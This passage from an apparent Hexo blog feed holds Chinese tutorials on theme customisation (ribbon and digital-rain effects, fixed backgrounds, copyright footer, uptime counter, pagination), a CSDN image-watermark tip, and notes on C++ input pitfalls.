class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 样式二（飘动的彩带） --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://g.joyinshare.com/hc/piao.js&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><h3 id="13-添加背景代码雨效果"><a href="#13-添加背景代码雨效果" class="headerlink" title="13.添加背景代码雨效果"></a>13.添加背景代码雨效果</h3><p>新建 DigitalRain.js，写入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">window.onload = function()&#123;<br>    //获取画布对象<br>    var canvas = document.getElementById(&quot;canvas&quot;);<br>    //获取画布的上下文<br>    var context =canvas.getContext(&quot;2d&quot;);<br>    var s = window.screen;<br>    var W = canvas.width = s.width;<br>    var H = canvas.height;<br>    //获取浏览器屏幕的宽度和高度<br>    //var W = window.innerWidth;<br>    //var H = window.innerHeight;<br>    //设置canvas的宽度和高度<br>    canvas.width = W;<br>    canvas.height = H;<br>    //每个文字的字体大小<br>    var fontSize = 12;<br>    //计算列<br>    var colunms = Math.floor(W /fontSize);<br>    //记录每列文字的y轴坐标<br>    var drops = [];<br>    //给每一个文字初始化一个起始点的位置<br>    for(var i=0;i&lt;colunms;i++)&#123;<br>        drops.push(0);<br>    &#125;<br>    //运动的文字<br>    var str =&quot;WELCOME TO WWW.ITRHX.COM&quot;;<br>    //4:fillText(str,x,y);原理就是去更改y的坐标位置<br>    //绘画的函数<br>    function draw()&#123;<br>        context.fillStyle = &quot;rgba(238,238,238,.08)&quot;;//遮盖层<br>        context.fillRect(0,0,W,H);<br>        //给字体设置样式<br>        context.font = &quot;600 &quot;+fontSize+&quot;px  Georgia&quot;;<br>        //给字体添加颜色<br>        context.fillStyle = [&quot;#33B5E5&quot;, &quot;#0099CC&quot;, &quot;#AA66CC&quot;, &quot;#9933CC&quot;, &quot;#99CC00&quot;, &quot;#669900&quot;, &quot;#FFBB33&quot;, &quot;#FF8800&quot;, &quot;#FF4444&quot;, &quot;#CC0000&quot;][parseInt(Math.random() * 10)];//randColor();可以rgb,hsl, 标准色，十六进制颜色<br>        //写入画布中<br>        for(var i=0;i&lt;colunms;i++)&#123;<br>            var index = Math.floor(Math.random() * str.length);<br>            var x = i*fontSize;<br>            var y = drops[i] *fontSize;<br>            context.fillText(str[index],x,y);<br>            //如果要改变时间，肯定就是改变每次他的起点<br>            if(y &gt;= canvas.height &amp;&amp; Math.random() &gt; 0.99)&#123;<br>                drops[i] = 0;<br>            &#125;<br>            drops[i]++;<br>        &#125;<br>    &#125;;<br>    function randColor()&#123;//随机颜色<br>        var r = Math.floor(Math.random() * 256);<br>        var g = Math.floor(Math.random() * 256);<br>        var b = Math.floor(Math.random() * 256);<br>        return &quot;rgb(&quot;+r+&quot;,&quot;+g+&quot;,&quot;+b+&quot;)&quot;;<br>    &#125;<br>    draw();<br>    setInterval(draw,35);<br>&#125;;<br><br></code></pre></div></td></tr></table></figure><p>在主题文件的相关css文件中（以 Material X 1.2.1 主题为例，在\themes\material-x-1.2.1\source\less_main.less 文件末尾）添加以下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">canvas &#123;<br>  position: fixed;<br>  right: 0px;<br>  bottom: 0px;<br>  min-width: 100%;<br>  min-height: 100%;<br>  height: auto;<br>  width: auto;<br>  z-index: -1;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>然后在主题的 layout.ejs 文件中引入即可：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 数字雨 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;canvas&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1440&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;900&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/DigitalRain.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>之后就可以看见效果了。</p><h3 id="14-背景图片固定"><a href="#14-背景图片固定" class="headerlink" title="14.背景图片固定"></a>14.背景图片固定</h3><blockquote><ol><li>在<code>主题目录</code>下的<code>scripts</code>文件夹下新建<code>injector.js</code>，在injector.js中写下这些代码。</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">// 全屏背景的需要导入这些js</span><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">root</span>: siteRoot = <span class="hljs-string">&quot;/&quot;</span> &#125; = hexo.config;<br>hexo.extend.injector.register(<span class="hljs-string">&quot;body_begin&quot;</span>, <span class="hljs-string">`&lt;div id=&quot;web_bg&quot;&gt;&lt;/div&gt;`</span>);<br>hexo.extend.injector.register(<br>  <span class="hljs-string">&quot;body_end&quot;</span>,<br>  <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">$&#123;siteRoot&#125;</span>js/backgroundize.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">  &lt;link defer rel=&quot;stylesheet&quot; href=&quot;<span class="hljs-subst">$&#123;siteRoot&#125;</span>styles/backgroundize.css&quot; /&gt;</span><br><span class="hljs-string">  `</span><br>);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>在主题目录下的<code>source</code>文件夹下的<code>js文件夹</code>中新建<code>backgroundize.js</code>文件，内容如下：</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> bannerContainer = $(<span class="hljs-string">&quot;#banner&quot;</span>);<br><span class="hljs-keyword">const</span> viewBg = $(<span class="hljs-string">&quot;#web_bg&quot;</span>);<br><span class="hljs-keyword">const</span> bannerMask = $(<span class="hljs-string">&quot;#banner .mask&quot;</span>);<br><span class="hljs-keyword">const</span> bg = $(bannerContainer).css(<span class="hljs-string">&quot;background-image&quot;</span>);<br>$(viewBg).css(<span class="hljs-string">&quot;background-image&quot;</span>, bg);<br>$(bannerContainer).css(<span class="hljs-string">&quot;background-image&quot;</span>, <span class="hljs-string">&quot;url()&quot;</span>);<br><span class="hljs-keyword">const</span> color = $(bannerMask).css(<span class="hljs-string">&quot;background-color&quot;</span>);<br>$(bannerMask).css(<span class="hljs-string">&quot;background-color&quot;</span>, <span class="hljs-string">`rgba(0,0,0,0)`</span>);<br>$(viewBg).css(<span class="hljs-string">&quot;background-color&quot;</span>, color);<br></code></pre></div></td></tr></table></figure><p>以上文件和代码也可以在<code>public</code>文件夹中的<code>js</code>文件夹中建，但推荐上面的做法。</p><blockquote><ol start="3"><li>在<code>public</code>文件夹中新建<code>styles文件夹</code>，并在其中新增<code>backgroundize.css</code>文件，内容如下：</li></ol></blockquote><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#web_bg</span> &#123;<br>  <span class="hljs-attribute">position</span>: fixed;<br>  <span class="hljs-attribute">z-index</span>: -<span class="hljs-number">999</span>;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">background-attachment</span>: local;<br>  <span class="hljs-attribute">background-position</span>: center;<br>  -webkit-<span class="hljs-attribute">background-size</span>: cover;<br>  -moz-<span class="hljs-attribute">background-size</span>: cover;<br>  <span class="hljs-attribute">background-size</span>: cover;<br>  <span class="hljs-attribute">background-repeat</span>: repeat;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo-Fluid主题-文章末尾添加作者和版权声明等</title>
    <link href="/2021/04/07/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E6%96%87%E7%AB%A0%E6%9C%AB%E5%B0%BE%E6%B7%BB%E5%8A%A0%E4%BD%9C%E8%80%85%E5%92%8C%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E7%AD%89/"/>
    <url>/2021/04/07/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E6%96%87%E7%AB%A0%E6%9C%AB%E5%B0%BE%E6%B7%BB%E5%8A%A0%E4%BD%9C%E8%80%85%E5%92%8C%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E7%AD%89/</url>
    
    <content type="html"><![CDATA[<p>hexo-Fluid主题中，在文章的末尾添加作者、版权声明和本文链接，添加网站已运行时间。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-文章版权信息"><a href="#1-文章版权信息" class="headerlink" title="1.文章版权信息"></a>1.文章版权信息</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">打开 themes\fluid\layout 中的 post.ejs 文件； 即打开fluid主题里面的文件<br></code></pre></div></td></tr></table></figure><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">找到以下内容并进行修改；<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210407224015302.png"><br>将红色部分替换为以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">   &lt;% <span class="hljs-keyword">if</span>(theme.post.copyright.enable &amp;&amp; theme.post.copyright.content &amp;&amp; page.copyright !== <span class="hljs-literal">false</span>) &#123; %&gt;&lt;p class=<span class="hljs-string">&quot;note note-warning&quot;</span>&gt;<br>&lt;strong&gt;本文作者: &lt;/strong&gt;&lt;a href=<span class="hljs-string">&quot;&lt;%- url_for() %&gt;&quot;</span>&gt;&lt;%- theme.about.name || config.author || config.title %&gt;&lt;/a&gt; &lt;br&gt;<br>&lt;strong&gt;本文链接: &lt;/strong&gt;&lt;a href=<span class="hljs-string">&quot;&lt;%- full_url_for(page.path) %&gt;&quot;</span>&gt;&lt;%-   full_url_for(page.path) %&gt;&lt;/a&gt; &lt;br&gt;<br>&lt;strong&gt;版权声明: &lt;/strong&gt;&lt;%- theme.post.copyright.content %&gt;<br>   &lt;/p&gt;<br>   &lt;% &#125; %&gt;<br></code></pre></div></td></tr></table></figure><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">保存文本，重启本地预览即可。<br></code></pre></div></td></tr></table></figure><h2 id="2-网站运行时间添加"><a href="#2-网站运行时间添加" class="headerlink" title="2.网站运行时间添加"></a>2.网站运行时间添加</h2><p>只需要在主题配置中的 <code>footer: content</code> 添加：</p><figure class="highlight yml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yml"><span class="hljs-attr">footer:</span><br>  <span class="hljs-attr">content:</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">    &lt;a href=&quot;javascript:&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;span&gt;墨水的记忆&lt;/span&gt;&lt;/a&gt;</span><br><span class="hljs-string">    &lt;i class=&quot;iconfont icon-love&quot;&gt;&lt;/i&gt;</span><br><span class="hljs-string">    &lt;a href=&quot;javascript:&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;span&gt;DragonOne&lt;/span&gt;&lt;/a&gt;</span><br><span class="hljs-string">    &lt;div&gt;</span><br><span class="hljs-string">      &lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;</span><br><span class="hljs-string">      &lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt;</span><br><span class="hljs-string">      &lt;script src=&quot;/js/duration.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">  &#x27;</span><br></code></pre></div></td></tr></table></figure><p>在博客主题目录下创建 <code>source/js/duration.js</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">!(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> now = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();<br>    <span class="hljs-keyword">var</span> grt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(<span class="hljs-string">&quot;2020-01-01 00:00:00&quot;</span>);  <span class="hljs-comment">/** 此处是计时的起始时间 **/</span><br>    now.setTime(now.getTime()+<span class="hljs-number">250</span>);<br>    days = (now - grt ) / <span class="hljs-number">1000</span> / <span class="hljs-number">60</span> / <span class="hljs-number">60</span> / <span class="hljs-number">24</span>;<br>    dnum = <span class="hljs-built_in">Math</span>.floor(days);<br>    hours = (now - grt ) / <span class="hljs-number">1000</span> / <span class="hljs-number">60</span> / <span class="hljs-number">60</span> - (<span class="hljs-number">24</span> * dnum);<br>    hnum = <span class="hljs-built_in">Math</span>.floor(hours);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">String</span>(hnum).length === <span class="hljs-number">1</span> )&#123;<br>      hnum = <span class="hljs-string">&quot;0&quot;</span> + hnum;<br>    &#125;<br>    minutes = (now - grt ) / <span class="hljs-number">1000</span> /<span class="hljs-number">60</span> - (<span class="hljs-number">24</span> * <span class="hljs-number">60</span> * dnum) - (<span class="hljs-number">60</span> * hnum);<br>    mnum = <span class="hljs-built_in">Math</span>.floor(minutes);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">String</span>(mnum).length === <span class="hljs-number">1</span> )&#123;<br>      mnum = <span class="hljs-string">&quot;0&quot;</span> + mnum;<br>    &#125;<br>    seconds = (now - grt ) / <span class="hljs-number">1000</span> - (<span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * dnum) - (<span class="hljs-number">60</span> * <span class="hljs-number">60</span> * hnum) - (<span class="hljs-number">60</span> * mnum);<br>    snum = <span class="hljs-built_in">Math</span>.round(seconds);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">String</span>(snum).length === <span class="hljs-number">1</span> )&#123;<br>      snum = <span class="hljs-string">&quot;0&quot;</span> + snum;<br>    &#125;<br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;timeDate&quot;</span>).innerHTML = <span class="hljs-string">&quot;本站安全运行&amp;nbsp&quot;</span>+dnum+<span class="hljs-string">&quot;&amp;nbsp天&quot;</span>;<br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;times&quot;</span>).innerHTML = hnum + <span class="hljs-string">&quot;&amp;nbsp小时&amp;nbsp&quot;</span> + mnum + <span class="hljs-string">&quot;&amp;nbsp分&amp;nbsp&quot;</span> + snum + <span class="hljs-string">&quot;&amp;nbsp秒&quot;</span>;<br>  &#125;<br>  <span class="hljs-built_in">setInterval</span>(update, <span class="hljs-number">1000</span>);<br>&#125;)();<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSDN图片一招除去水印</title>
    <link href="/2021/04/07/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/CSDN%E5%9B%BE%E7%89%87%E4%B8%80%E6%8B%9B%E9%99%A4%E5%8E%BB%E6%B0%B4%E5%8D%B0/"/>
    <url>/2021/04/07/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/CSDN%E5%9B%BE%E7%89%87%E4%B8%80%E6%8B%9B%E9%99%A4%E5%8E%BB%E6%B0%B4%E5%8D%B0/</url>
    
    <content type="html"><![CDATA[<p>在CSDN上发布文章时，自己发的图片会产生一个水印，水印可能会挡住一些内容。简单一招除去水印。</p><hr><h6 id="在上传图片时，删除-问号-后面的所有代码即可。如图。"><a href="#在上传图片时，删除-问号-后面的所有代码即可。如图。" class="headerlink" title="在上传图片时，删除 问号(?)后面的所有代码即可。如图。"></a>在上传图片时，删除 问号(?)后面的所有代码即可。如图。</h6><p><img src="https://img-blog.csdnimg.cn/20210407202840792.png"></p>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo-Fluid主题-博客首页文章分页实现</title>
    <link href="/2021/04/07/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E5%8D%9A%E5%AE%A2%E9%A6%96%E9%A1%B5%E6%96%87%E7%AB%A0%E5%88%86%E9%A1%B5%E5%AE%9E%E7%8E%B0/"/>
    <url>/2021/04/07/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E5%8D%9A%E5%AE%A2%E9%A6%96%E9%A1%B5%E6%96%87%E7%AB%A0%E5%88%86%E9%A1%B5%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h5 id="hexo博客首页文章分页实现。"><a href="#hexo博客首页文章分页实现。" class="headerlink" title="hexo博客首页文章分页实现。"></a>hexo博客首页文章分页实现。</h5><hr><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">在搭建完Hexo + Github pages的博客后，会发现他的主页会默认显示很多的文章（默认10篇），而我们也许需要自定义分页进行管理主页博客的显示数量。<br></code></pre></div></td></tr></table></figure><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.首先我们找到Hexo的根配置文件_config.yml，注意不是主题(themes)中的配置文件。<br></code></pre></div></td></tr></table></figure><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">2.找到 index_generator 中的 per_page 。然后修改后面的数即可。如下图。<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210407201120414.png"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">3.结束本地预览，再重新预览即可。即重启一下本地预览即可。之后就可以发布了.<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-C++中的输入问题</title>
    <link href="/2021/04/07/ACM/ACM-C++%E4%B8%AD%E7%9A%84%E8%BE%93%E5%85%A5%E9%97%AE%E9%A2%98/"/>
    <url>/2021/04/07/ACM/ACM-C++%E4%B8%AD%E7%9A%84%E8%BE%93%E5%85%A5%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>C++中的几种输入方式，以及记录一些在输入输出中可能会遇到的让人头大的坑。</p><h1 id="一-输入带有空格的整行英语字母"><a href="#一-输入带有空格的整行英语字母" class="headerlink" title="一.输入带有空格的整行英语字母"></a>一.输入带有空格的整行英语字母</h1><h3 id="1-cin"><a href="#1-cin" class="headerlink" title="1.cin"></a>1.cin</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">遇“空格”、“TAB”、“回车”就结束<br></code></pre></div></td></tr></table></figure><h3 id="2-cin-getline"><a href="#2-cin-getline" class="headerlink" title="2.cin.getline()"></a>2.cin.getline()</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">接收一个字符串，可以接收空格并输出。可以设置自定义结束符。<br><span class="hljs-built_in">cin</span>.getline(接收字符串的变量,接收字符个数,结束字符) <span class="hljs-comment">//接收字符串的变量不能为string，需要是字符数组</span><br>当第三个参数省略时，系统默认为<span class="hljs-string">&#x27;\0&#x27;</span>。接收n个字符到m中，其中最后一个为<span class="hljs-string">&#x27;\0&#x27;</span>，所以只看到n<span class="hljs-number">-1</span>个字符输出.<br>例子<br><span class="hljs-built_in">cin</span>.getline(m,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br>当输入jlkjkljkl时 输出 jlkj<br>输入jkaljkljkl时，输出 jk<br></code></pre></div></td></tr></table></figure><h3 id="3-getline"><a href="#3-getline" class="headerlink" title="3.getline()"></a>3.getline()</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">接收一个字符串，可以接收空格并输出，需包含头文件“<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;”</span></span><br><span class="hljs-built_in">string</span> str;<br>getline(<span class="hljs-built_in">cin</span>,str); <span class="hljs-comment">//str需要是string，不能为字符数组</span><br></code></pre></div></td></tr></table></figure><h3 id="输入陨石坑"><a href="#输入陨石坑" class="headerlink" title="输入陨石坑"></a>输入陨石坑</h3><p>要求：输入一个数n，再输入一句由n个单词构成英文句子(包括空格)。用C++中的输入输出实现。</p><p>错误的输入方式一：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">string</span> s;<br>getline(<span class="hljs-built_in">cin</span>,s);<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">25</span><br>abcd<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">25</span> <span class="hljs-comment">//当输入25后按回车，程序就结束了。不能再输入后面的 abcd 字符串了。</span><br>    <span class="hljs-comment">//这里会空一个回车行</span><br><br><span class="hljs-comment">//但是，当你换一种输入方式时，又有另一种情况</span><br><span class="hljs-comment">//输入</span><br><span class="hljs-number">25</span> abcd<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">25</span><br> abcd <span class="hljs-comment">//字符串前面有一个空格</span><br></code></pre></div></td></tr></table></figure><p>错误的输入方式二：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>;<br>getchar(); <span class="hljs-comment">//换成char ch=getchar() 也是同样的效果。c++中的清空输入缓冲区 cin.sync() 也不行</span><br><span 